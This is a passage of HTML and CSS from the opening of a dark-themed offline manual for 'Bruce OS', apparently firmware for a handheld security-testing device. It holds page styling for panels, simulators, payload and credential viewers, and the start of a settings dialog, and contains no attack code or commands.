<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#09090b">
    <meta name="description" content="Bruce 1.12 - Ultimate Offline Knowledge Base & Operations Manual">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="Bruce OS">

    <!-- PWA Manifest (Embedded) -->
    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQnJ1Y2UgT1MgVWx0aW1hdGUiLCJzaG9ydF9uYW1lIjoiQnJ1Y2UiLCJzdGFydF91cmwiOiIuLyIsImRpc3BsYXkiOiJzdGFuZGFsb25lIiwiYmFja2dyb3VuZF9jb2xvciI6IiMwOTA5MGIiLCJ0aGVtZV9jb2xvciI6IiNhODU1ZjciLCJpY29ucyI6W3sic3JjIjoiZGF0YTppbWFnZS9zdmcreG1sLDxzdmcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2aWV3Qm94PScwIDAgNTEyIDUxMic+PHJlY3QgZmlsbD0nJTIzMDkwOTBiJyB3aWR0aD0nNTEyJyBoZWlnaHQ9JzUxMicvPjxjaXJjbGUgY3g9JzI1NicgY3k9JzI1Nicgcj0nMjAwJyBmaWxsPSclMjNhODU1ZjcnLz48dGV4dCB4PScyNTYnIHk9JzI5MCcgZm9udC1zaXplPScxNjAnIGZvbnQtd2VpZ2h0PSc5MDAnIHRleHQtYW5jaG9yPSdtaWRkbGUnIGZpbGw9JyUyMzA5MDkwYicgZm9udC1mYW1pbHk9J3N5c3RlbS11aSc+QjwvdGV4dD48L3N2Zz4iLCJzaXplcyI6IjUxMng1MTIiLCJ0eXBlIjoiaW1hZ2Uvc3ZnK3htbCJ9XX0=">

    <title>Bruce OS Ultimate // v1.12</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-dark: #09090b;
            --bg-panel: #121215;
            --bg-card: #18181b;
            --bg-wiki: #101012;

            --primary: #a855f7; /* Purple */
            --primary-dim: rgba(168, 85, 247, 0.1);

            --accent: #22c55e; /* Green */
            --danger: #ef4444;
            --info: #3b82f6;

            --text-main: #e4e4e7;
            --text-muted: #a1a1aa;

            --border: #27272a;
            --radius: 12px;

            --font-ui: 'Inter', sans-serif;
            --font-code: 'JetBrains Mono', monospace;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body, html {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: var(--font-ui);
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
        }

        /* --- Layout Grid --- */
        .app-container {
            display: grid;
            grid-template-columns: 240px 1fr 340px; /* Nav | Main | Wiki */
            height: 100%;
            width: 100%;
            overflow: hidden;
        }

        /* --- 1. Sidebar --- */
        .sidebar {
            background: var(--bg-panel);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            padding: 20px;
            z-index: 20;
            overflow-y: auto;
        }

        .brand {
            font-family: var(--font-code);
            font-size: 1.2rem;
            font-weight: 800;
            color: var(--primary);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: -0.5px;
            user-select: none;
        }

        .nav-section-title {
            font-size: 0.7rem;
            text-transform: uppercase;
            color: var(--text-muted);
            margin: 20px 0 10px 5px;
            font-weight: 700;
            letter-spacing: 1px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid transparent;
            color: var(--text-muted);
            padding: 10px 14px;
            border-radius: 8px;
            text-align: left;
            cursor: pointer;
            font-family: var(--font-ui);
            font-weight: 600;
            font-size: 0.9rem;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 4px;
        }

        .nav-btn:hover { background: rgba(255,255,255,0.05); color: var(--text-main); }
        .nav-btn.active { background: var(--primary-dim); color: var(--primary); border: 1px solid rgba(168, 85, 247, 0.2); }

        /* --- 2. Main Stage --- */
        .main-stage {
            display: flex;
            flex-direction: column;
            background: var(--bg-dark);
            position: relative;
            min-width: 0;
        }

        .top-bar {
            padding: 0 30px;
            height: 70px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            background: rgba(9, 9, 11, 0.8);
            backdrop-filter: blur(10px);
            z-index: 10;
            justify-content: space-between;
        }

        .search-container {
            position: relative;
            width: 100%;
            max-width: 500px;
        }

        .search-input {
            width: 100%;
            background: var(--bg-card);
            border: 1px solid var(--border);
            color: var(--text-main);
            padding: 10px 16px 10px 40px;
            border-radius: 8px;
            font-family: var(--font-ui);
            font-size: 0.9rem;
            transition: all 0.2s;
        }

        .search-input:focus { outline: none; border-color: var(--primary); }
        .search-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--text-muted); opacity: 0.7; }

        .offline-badge {
            font-size: 0.75rem;
            background: rgba(255,255,255,0.1);
            padding: 4px 8px;
            border-radius: 4px;
            color: var(--text-muted);
            display: none;
        }
        .offline-badge.visible { display: block; }

        .content-scroll {
            flex: 1;
            overflow-y: auto;
            padding: 30px;
            scroll-behavior: smooth;
        }

        /* --- 3. Wiki Sidebar --- */
        .wiki-sidebar {
            background: var(--bg-wiki);
            border-left: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        .wiki-header {
            height: 70px;
            padding: 0 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-wiki);
            flex-shrink: 0;
        }

        .wiki-title { font-weight: 700; font-size: 0.9rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }

        .wiki-content {
            flex: 1;
            overflow-y: auto;
            padding: 25px;
            font-size: 0.95rem;
            line-height: 1.6;
        }

        /* Wiki Typography */
        .wiki-article h2 { font-size: 1.4rem; margin: 0 0 15px 0; color: var(--text-main); font-family: var(--font-code); border-bottom: 2px solid var(--border); padding-bottom: 10px; }
        .wiki-article h3 { font-size: 1rem; margin: 25px 0 10px 0; color: var(--primary); font-weight: 600; }
        .wiki-article p { margin-bottom: 15px; color: var(--text-muted); }
        .wiki-article ul, .wiki-article ol { padding-left: 20px; color: var(--text-muted); margin-bottom: 20px; }
        .wiki-article li { margin-bottom: 8px; }

        .code-block {
            background: #000;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid var(--border);
            font-family: var(--font-code);
            font-size: 0.8rem;
            color: var(--accent);
            margin: 15px 0;
            overflow-x: auto;
            white-space: pre;
        }

        .info-box { background: rgba(59, 130, 246, 0.1); border-left: 3px solid var(--info); padding: 12px; border-radius: 4px; font-size: 0.85rem; margin: 15px 0; color: #dbeafe; }
        .warning-box { background: rgba(239, 68, 68, 0.1); border-left: 3px solid var(--danger); padding: 12px; border-radius: 4px; font-size: 0.85rem; margin: 15px 0; color: #fca5a5; }
        .success-box { background: rgba(34, 197, 94, 0.1); border-left: 3px solid var(--accent); padding: 12px; border-radius: 4px; font-size: 0.85rem; margin: 15px 0; color: #bbf7d0; }

        /* Enhanced Infographic Styles */
        .step-flow { display: flex; flex-direction: column; gap: 0; margin: 20px 0; }
        .step-item { display: flex; align-items: flex-start; gap: 15px; position: relative; padding-bottom: 20px; }
        .step-item:not(:last-child)::before { content: ''; position: absolute; left: 17px; top: 40px; bottom: 0; width: 2px; background: var(--border); }
        .step-num { width: 36px; height: 36px; background: var(--primary); color: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.9rem; flex-shrink: 0; }
        .step-content { flex: 1; }
        .step-title { font-weight: 700; color: var(--text-main); margin-bottom: 4px; }
        .step-desc { color: var(--text-muted); font-size: 0.85rem; line-height: 1.5; }

        .diagram-box { background: #0a0a0c; border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin: 15px 0; font-family: var(--font-code); font-size: 0.75rem; overflow-x: auto; }
        .diagram-box pre { margin: 0; color: var(--text-muted); line-height: 1.4; }
        .diagram-label { color: var(--primary); }
        .diagram-arrow { color: var(--accent); }
        .diagram-data { color: var(--info); }

        .spec-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
        .spec-item { background: rgba(255,255,255,0.03); padding: 10px 12px; border-radius: 6px; border: 1px solid var(--border); }
        .spec-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .spec-value { font-family: var(--font-code); color: var(--accent); font-weight: 600; margin-top: 2px; }

        .freq-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.8rem; }
        .freq-table th { background: rgba(168, 85, 247, 0.15); color: var(--primary); padding: 8px 10px; text-align: left; font-weight: 600; }
        .freq-table td { padding: 8px 10px; border-bottom: 1px solid var(--border); color: var(--text-muted); }
        .freq-table tr:hover td { background: rgba(255,255,255,0.02); }

        .timeline { position: relative; margin: 20px 0; padding-left: 20px; border-left: 2px solid var(--primary); }
        .timeline-item { margin-bottom: 15px; position: relative; }
        .timeline-item::before { content: ''; position: absolute; left: -25px; top: 5px; width: 10px; height: 10px; background: var(--primary); border-radius: 50%; }
        .timeline-time { font-size: 0.7rem; color: var(--primary); font-weight: 600; text-transform: uppercase; }
        .timeline-text { color: var(--text-muted); font-size: 0.85rem; margin-top: 2px; }

        .attack-chain { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin: 15px 0; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px; }
        .chain-node { background: var(--bg-card); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; font-size: 0.8rem; color: var(--text-main); }
        .chain-node.active { border-color: var(--primary); background: var(--primary-dim); }
        .chain-arrow { color: var(--accent); font-weight: bold; }

        .metric-row { display: flex; gap: 15px; margin: 15px 0; }
        .metric-card { flex: 1; background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 8px; padding: 12px; text-align: center; }
        .metric-value { font-family: var(--font-code); font-size: 1.4rem; font-weight: 800; color: var(--accent); }
        .metric-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; margin-top: 4px; }

        .pin-diagram { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 15px 0; }
        .pin-item { background: #1a1a1d; border: 1px solid var(--border); padding: 8px; border-radius: 4px; text-align: center; font-size: 0.75rem; }
        .pin-name { color: var(--primary); font-weight: 600; font-family: var(--font-code); }
        .pin-func { color: var(--text-muted); font-size: 0.65rem; margin-top: 2px; }

        .legal-notice { background: linear-gradient(135deg, rgba(239,68,68,0.1), rgba(239,68,68,0.05)); border: 1px solid rgba(239,68,68,0.3); border-radius: 8px; padding: 15px; margin: 15px 0; }
        .legal-title { color: var(--danger); font-weight: 700; font-size: 0.85rem; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
        .legal-text { color: #fca5a5; font-size: 0.8rem; line-height: 1.5; }

        /* Interactive Dashboard Styles */
        .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        @media (max-width: 900px) { .dashboard-grid { grid-template-columns: 1fr; } }
        
        .sim-panel { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
        .sim-header { background: rgba(0,0,0,0.3); padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .sim-title { font-family: var(--font-code); font-weight: 700; font-size: 0.85rem; color: var(--primary); display: flex; align-items: center; gap: 8px; }
        .sim-status { font-size: 0.7rem; padding: 4px 8px; border-radius: 4px; font-weight: 600; }
        .sim-status.ready { background: rgba(34,197,94,0.2); color: var(--accent); }
        .sim-status.running { background: rgba(168,85,247,0.2); color: var(--primary); animation: pulse 1s infinite; }
        .sim-status.error { background: rgba(239,68,68,0.2); color: var(--danger); }
        .sim-body { padding: 16px; }
        
        .sim-screen { background: #000; border: 2px solid #333; border-radius: 6px; padding: 12px; font-family: var(--font-code); font-size: 0.75rem; color: var(--accent); min-height: 120px; margin-bottom: 12px; overflow: hidden; }
        .sim-screen .line { margin: 2px 0; opacity: 0; animation: typeIn 0.3s forwards; }
        .sim-screen .line.error { color: var(--danger); }
        .sim-screen .line.info { color: var(--info); }
        .sim-screen .line.warn { color: #fbbf24; }
        .sim-screen .cursor { display: inline-block; width: 8px; height: 14px; background: var(--accent); animation: blink 1s infinite; }
        
        .sim-controls { display: flex; gap: 8px; flex-wrap: wrap; }
        .sim-btn { background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-main); padding: 8px 16px; border-radius: 6px; font-family: var(--font-code); font-size: 0.8rem; cursor: pointer; transition: all 0.2s; flex: 1; min-width: 80px; }
        .sim-btn:hover { background: var(--primary-dim); border-color: var(--primary); }
        .sim-btn:active { transform: scale(0.98); }
        .sim-btn.primary { background: var(--primary); color: #000; border-color: var(--primary); }
        .sim-btn.danger { background: rgba(239,68,68,0.2); border-color: var(--danger); color: var(--danger); }
        .sim-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .sim-input { background: #000; border: 1px solid var(--border); color: var(--text-main); padding: 8px 12px; border-radius: 4px; font-family: var(--font-code); font-size: 0.8rem; width: 100%; margin-bottom: 12px; }
        .sim-input:focus { outline: none; border-color: var(--primary); }
        
        .sim-select { background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-main); padding: 8px 12px; border-radius: 4px; font-family: var(--font-code); font-size: 0.8rem; width: 100%; margin-bottom: 12px; cursor: pointer; }
        
        .sim-list { max-height: 150px; overflow-y: auto; margin-bottom: 12px; }
        .sim-list-item { padding: 8px 12px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.2s; }
        .sim-list-item:hover { background: rgba(255,255,255,0.05); }
        .sim-list-item.selected { background: var(--primary-dim); border-left: 3px solid var(--primary); }
        .sim-list-item .ssid { font-family: var(--font-code); font-size: 0.85rem; }
        .sim-list-item .meta { font-size: 0.7rem; color: var(--text-muted); }
        .sim-list-item .rssi { font-family: var(--font-code); font-size: 0.75rem; }
        .rssi-bar { width: 40px; height: 8px; background: #333; border-radius: 4px; overflow: hidden; }
        .rssi-fill { height: 100%; background: var(--accent); transition: width 0.3s; }
        
        .sim-progress { height: 4px; background: #333; border-radius: 2px; overflow: hidden; margin: 12px 0; }
        .sim-progress-bar { height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); width: 0%; transition: width 0.3s; }
        
        .sim-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 12px; }
        .sim-stat { background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; text-align: center; }
        .sim-stat-value { font-family: var(--font-code); font-size: 1.1rem; font-weight: 700; color: var(--accent); }
        .sim-stat-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; }
        
        .quick-actions { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-top: 20px; }
        .quick-action { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; cursor: pointer; transition: all 0.2s; text-align: center; }
        .quick-action:hover { border-color: var(--primary); transform: translateY(-2px); }
        .quick-action-icon { font-size: 1.5rem; margin-bottom: 8px; }
        .quick-action-title { font-family: var(--font-code); font-size: 0.85rem; font-weight: 600; color: var(--text-main); }
        .quick-action-desc { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; }
        
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
        @keyframes typeIn { from { opacity: 0; transform: translateX(-5px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        @keyframes glow { 0%, 100% { box-shadow: 0 0 5px var(--primary); } 50% { box-shadow: 0 0 20px var(--primary), 0 0 30px var(--primary); } }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        @keyframes ripple { 0% { transform: scale(0); opacity: 1; } 100% { transform: scale(4); opacity: 0; } }

        /* Toast Notifications */
        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
        .toast { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; animation: slideIn 0.3s ease; pointer-events: auto; max-width: 320px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .toast.removing { animation: slideOut 0.3s ease forwards; }
        .toast-icon { font-size: 1.2rem; }
        .toast-content { flex: 1; }
        .toast-title { font-weight: 600; font-size: 0.85rem; color: var(--text-main); }
        .toast-msg { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px; }
        .toast.success { border-left: 3px solid var(--accent); }
        .toast.error { border-left: 3px solid var(--danger); }
        .toast.info { border-left: 3px solid var(--info); }
        .toast.warning { border-left: 3px solid #f59e0b; }

        /* Modal System */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; display: flex; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: all 0.3s; backdrop-filter: blur(4px); }
        .modal-overlay.active { opacity: 1; visibility: visible; }
        .modal { background: var(--bg-panel); border: 1px solid var(--border); border-radius: var(--radius); width: 90%; max-width: 600px; max-height: 80vh; overflow: hidden; transform: scale(0.9); transition: transform 0.3s; }
        .modal-overlay.active .modal { transform: scale(1); }
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-title { font-family: var(--font-code); font-weight: 700; color: var(--primary); }
        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 1.5rem; cursor: pointer; padding: 0; line-height: 1; }
        .modal-close:hover { color: var(--text-main); }
        .modal-body { padding: 20px; overflow-y: auto; max-height: calc(80vh - 120px); }
        .modal-footer { padding: 16px 20px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 10px; }

        /* Settings Panel */
        .settings-group { margin-bottom: 20px; }
        .settings-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
        .settings-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
        .settings-row:last-child { border-bottom: none; }
        .settings-name { font-size: 0.9rem; color: var(--text-main); }
        .settings-desc { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px; }
        
        /* Toggle Switch */
        .toggle { position: relative; width: 44px; height: 24px; background: #333; border-radius: 12px; cursor: pointer; transition: background 0.3s; }
        .toggle.active { background: var(--primary); }
        .toggle::after { content: ''; position: absolute; top: 2px; left: 2px; width: 20px; height: 20px; background: #fff; border-radius: 50%; transition: transform 0.3s; }
        .toggle.active::after { transform: translateX(20px); }

        /* Range Slider */
        .range-slider { width: 120px; height: 4px; background: #333; border-radius: 2px; appearance: none; cursor: pointer; }
        .range-slider::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: var(--primary); border-radius: 50%; cursor: pointer; }

        /* Signal Graph */
        .signal-graph { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 10px; height: 100px; position: relative; overflow: hidden; }
        .signal-graph canvas { width: 100%; height: 100%; }
        .signal-graph-label { position: absolute; top: 5px; left: 10px; font-size: 0.65rem; color: var(--text-muted); font-family: var(--font-code); }

        /* Packet Log */
        .packet-log { background: #000; border: 1px solid var(--border); border-radius: 6px; font-family: var(--font-code); font-size: 0.7rem; max-height: 200px; overflow-y: auto; }
        .packet-row { display: flex; padding: 4px 8px; border-bottom: 1px solid #1a1a1a; }
        .packet-row:hover { background: rgba(255,255,255,0.02); }
        .packet-time { color: var(--text-muted); width: 70px; flex-shrink: 0; }
        .packet-type { width: 60px; flex-shrink: 0; font-weight: 600; }
        .packet-type.tx { color: var(--danger); }
        .packet-type.rx { color: var(--accent); }
        .packet-data { color: var(--info); flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        /* Payload Library */
        .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        .payload-item { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; cursor: pointer; transition: all 0.2s; }
        .payload-item:hover { border-color: var(--primary); transform: translateY(-2px); }
        .payload-item.selected { border-color: var(--primary); background: var(--primary-dim); }
        .payload-name { font-family: var(--font-code); font-size: 0.85rem; font-weight: 600; color: var(--text-main); }
        .payload-desc { font-size: 0.7rem; color: var(--text-muted); margin-top: 4px; }
        .payload-os { font-size: 0.65rem; color: var(--primary); margin-top: 6px; }

        /* Network Topology */
        .topology-view { background: #000; border: 1px solid var(--border); border-radius: 8px; height: 200px; position: relative; overflow: hidden; }
        .topology-node { position: absolute; width: 50px; height: 50px; background: var(--bg-card); border: 2px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: all 0.3s; cursor: pointer; }
        .topology-node:hover { border-color: var(--primary); transform: scale(1.1); }
        .topology-node.ap { border-color: var(--accent); }
        .topology-node.client { border-color: var(--info); }
        .topology-node.attacker { border-color: var(--danger); animation: glow 2s infinite; }
        .topology-line { position: absolute; height: 2px; background: var(--border); transform-origin: left center; }
        .topology-line.active { background: var(--primary); animation: pulse 1s infinite; }

        /* Credential Viewer */
        .cred-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 10px; }
        .cred-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .cred-portal { font-family: var(--font-code); font-size: 0.85rem; color: var(--primary); }
        .cred-time { font-size: 0.7rem; color: var(--text-muted); }
        .cred-field { display: flex; gap: 10px; margin: 4px 0; }
        .cred-label { font-size: 0.75rem; color: var(--text-muted); width: 60px; }
        .cred-value { font-family: var(--font-code); font-size: 0.8rem; color: var(--accent); }

        /* Command History */
        .cmd-history { max-height: 150px; overflow-y: auto; margin-bottom: 10px; }
        .cmd-item { padding: 6px 10px; font-family: var(--font-code); font-size: 0.75rem; color: var(--text-muted); cursor: pointer; border-radius: 4px; }
        .cmd-item:hover { background: rgba(255,255,255,0.05); color: var(--text-main); }

        /* Keyboard Shortcuts */
        .shortcut-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .shortcut-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; }
        .shortcut-keys { display: flex; gap: 4px; }
        .shortcut-key { background: var(--bg-card); border: 1px solid var(--border); padding: 4px 8px; border-radius: 4px; font-family: var(--font-code); font-size: 0.75rem; color: var(--text-main); }
        .shortcut-action { font-size: 0.85rem; color: var(--text-muted); }

        /* Stats Dashboard */
        .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; text-align: center; }
        .stat-icon { font-size: 1.5rem; margin-bottom: 5px; }
        .stat-num { font-family: var(--font-code); font-size: 1.5rem; font-weight: 700; color: var(--accent); }
        .stat-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; }

        /* Floating Action Button */
        .fab { position: fixed; bottom: 90px; right: 20px; width: 56px; height: 56px; background: var(--primary); border: none; border-radius: 50%; color: #000; font-size: 1.5rem; cursor: pointer; box-shadow: 0 4px 20px rgba(168,85,247,0.4); transition: all 0.3s; z-index: 50; display: none; }
        .fab:hover { transform: scale(1.1); }
        @media (max-width: 768px) { .fab { display: flex; align-items: center; justify-content: center; } }

        /* Theme Variables - Light Mode */
        [data-theme="light"] {
            --bg-dark: #f4f4f5;
            --bg-panel: #ffffff;
            --bg-card: #fafafa;
            --bg-wiki: #f9f9f9;
            --text-main: #18181b;
            --text-muted: #71717a;
            --border: #e4e4e7;
        }

        /* --- Cards --- */
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 20px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
        }

        .card:hover { transform: translateY(-2px); border-color: var(--text-muted); }
        .card.active { border-color: var(--primary); box-shadow: 0 0 0 2px var(--primary-dim); background: #201f24; }

        .card-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
        .card-title { font-family: var(--font-code); font-weight: 700; font-size: 1.1rem; margin: 0; color: #fff; }
        .tag { font-size: 0.65rem; padding: 4px 8px; border-radius: 100px; font-weight: 700; text-transform: uppercase; }
        .tag.red { background: rgba(239, 68, 68, 0.15); color: var(--danger); }
        .tag.purple { background: rgba(168, 85, 247, 0.15); color: var(--primary); }
        .tag.green { background: rgba(34, 197, 94, 0.15); color: var(--accent); }
        .tag.blue { background: rgba(59, 130, 246, 0.15); color: var(--info); }
        .card-desc { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0; pointer-events: none; }

        /* --- Hardware Map --- */
        .device-wrapper {
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 30px;
            max-width: 600px;
            margin: 0 auto 30px;
            position: relative;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .screen-display {
            background: #050505; border: 2px solid #333; height: 100px; border-radius: 4px; margin-bottom: 20px;
            display: flex; align-items: center; justify-content: center; color: var(--accent); font-family: var(--font-code);
            text-align: center; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px;
            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
        }
        .keyboard-grid { display: grid; grid-template-columns: repeat(14, 1fr); gap: 6px; }
        .key {
            aspect-ratio: 1; background: #2a2a2e; border-radius: 4px; display: flex; align-items: center; justify-content: center;
            color: #777; font-size: 0.65rem; font-family: var(--font-code); cursor: pointer; transition: all 0.1s;
            box-shadow: 0 3px 0 #18181b; user-select: none;
        }
        .key:hover { background: #3f3f46; color: #fff; transform: translateY(-1px); }
        .key:active { background: #fff !important; color: #000 !important; transform: translateY(3px); box-shadow: none; }
        .key.enter { grid-column: span 2; width: 100%; aspect-ratio: auto; background: var(--accent); color: #000; font-weight: 800; }
        .key.special { background: #52525b; color: #fff; }

        /* --- Mobile Responsive --- */
        .mobile-toggle { display: none; }

        @media (max-width: 1024px) {
            .app-container { grid-template-columns: 220px 1fr 0; }
            .wiki-sidebar { display: none; }
        }

        @media (max-width: 768px) {
            .app-container { grid-template-columns: 1fr; grid-template-rows: 1fr 70px; display: block; }
            .sidebar {
                position: fixed; bottom: 0; left: 0; width: 100%; height: 70px;
                flex-direction: row; justify-content: space-around; padding: 10px;
                border-right: none; border-top: 1px solid var(--border);
                background: rgba(18, 18, 21, 0.95); backdrop-filter: blur(10px);
            }
            .brand, .nav-section-title, .sidebar .nav-text { display: none; }
            .nav-btn { flex-direction: column; gap: 4px; font-size: 0.6rem; padding: 6px; border: none; margin: 0; }
            .nav-btn svg { width: 20px; height: 20px; }

            .main-stage { height: calc(100vh - 70px); }
            .content-scroll { padding: 20px; }
            .keyboard-grid { gap: 3px; }
            .key { font-size: 0.5rem; }

            /* Mobile Wiki Slide-over */
            .wiki-sidebar {
                position: fixed; top: 0; right: -100%; width: 100%; height: 100%;
                z-index: 100; transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                display: flex !important; background: var(--bg-dark);
            }
            .wiki-sidebar.open { right: 0; }

            .mobile-toggle {
                display: block; position: absolute; right: 20px; top: 20px;
                color: var(--primary); background: rgba(168, 85, 247, 0.1);
                border: 1px solid rgba(168, 85, 247, 0.3); padding: 8px; border-radius: 8px;
            }
        }

        @keyframes fadeIn { from { opacity:0; transform:translateY(5px); } to { opacity:1; transform:translateY(0); } }

        /* Accessibility */
        .skip-link {
            position: absolute;
            top: -50px;
            left: 10px;
            background: var(--primary);
            color: #000;
            padding: 10px 16px;
            z-index: 1000;
            border-radius: 4px;
            font-weight: 600;
            transition: top 0.2s;
        }
        .skip-link:focus { top: 10px; }
        
        .nav-btn:focus, .card:focus, button:focus { 
            outline: 2px solid var(--primary); 
            outline-offset: 2px; 
        }
        .card[tabindex]:focus { 
            border-color: var(--primary); 
            box-shadow: 0 0 0 3px var(--primary-dim); 
        }
        
        .visually-hidden {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }
    </style>
</head>
<body>
<a href="#view-port" class="skip-link">Skip to main content</a>

<!-- Toast Notifications Container -->
<div class="toast-container" id="toastContainer"></div>

<!-- Settings Modal -->
<div class="modal-overlay" id="settingsModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">‚öôÔ∏è Settings</span>
            <button class="modal-close" onclick="UI.closeModal('settingsModal')">&times;</button>
        </div>
        <div class="modal-body">
            <div class="settings-group">
                <div class="settings-label">Appearance</div>
                <div class="settings-row">
                    <div><div class="settings-name">Dark Mode</div><div class="settings-desc">Use dark color scheme</div></div>
                    <div class="toggle active" id="toggleTheme" onclick="UI.toggleTheme()"></div>
                </div>
                <div class="settings-row">
                    <div><div class="settings-name">Sound Effects</div><div class="settings-desc">Play sounds on actions</div></div>
